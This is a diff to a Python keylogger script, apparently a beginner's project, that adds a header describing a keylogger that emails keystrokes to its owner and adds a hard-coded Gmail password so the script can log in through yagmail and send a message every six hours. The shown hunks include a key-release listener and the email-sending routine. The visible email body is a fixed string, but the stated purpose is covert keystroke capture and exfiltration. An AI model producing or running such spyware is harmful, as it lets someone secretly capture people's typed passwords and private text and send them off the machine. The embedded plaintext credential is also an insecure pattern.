@@ -1,3 +1,5 @@
+#Writing a keylogger that email the keystrokes to yourself using Python
+
 import keyboard                 #import keyboard for listening to keystrokes
 import logging                  #imporet Logging for recording keystrokes
 import datetime                 #import Datetime to get time and date for keystrokes
@@ -22,16 +24,20 @@ keyboard.on_release(callback=on_key_event) #setting up a listener for key releas
 def send_email():               #defining a function called 'send_email'
     
     sender_email = 'example_S@gmail.com'                        #creating a variable called 'sender_email' and assigning it the value of the sender's email address
+
+    #learning a better method of storing passwords and will implement it in the future    
+    sender_password = 'example_Spassword'                       #creating a variable called 'sender_password' and assigning it the value of the sender's email password
+
     recceiver_email = 'example_R@gmail.com'                     #creating a variable called 'receiver_email' and assigning it the value of the receiver's email address
     subject = 'Keylogger'                                       #creating a variable called 'subject' and assigning it the value of the subject of the email
     body = 'This is an email sent by a keylogger'               #creating a variable called 'body' and assigning it the value of the body of the email
 
     try:
-        yag = yagmail.SMTP(sender_email)                        #creating a variable called 'yag' and assigning it the value of the sender's email address
+        yag = yagmail.SMTP(sender_email,sender_password)        #creating a variable called 'yag' and assigning it the value of the sender's email address and password
         yag.send(recceiver_email, subject, body)                #sending the email
-        print('Email sent successfully XD')                        #printing a message if the email is sent successfully
+        print('Email sent successfully XD')                     #printing a message if the email is sent successfully
     except:
-        print('Error!!! email was not sent...')                      #printing a message if the email is not sent successfully
+        print('Error!!! email was not sent...')                 #printing a message if the email is not sent successfully
 
 while True:                                                     #creating an infinite loop
     time.sleep(21600)                                           #setting the time interval for sending the email to 6 hours
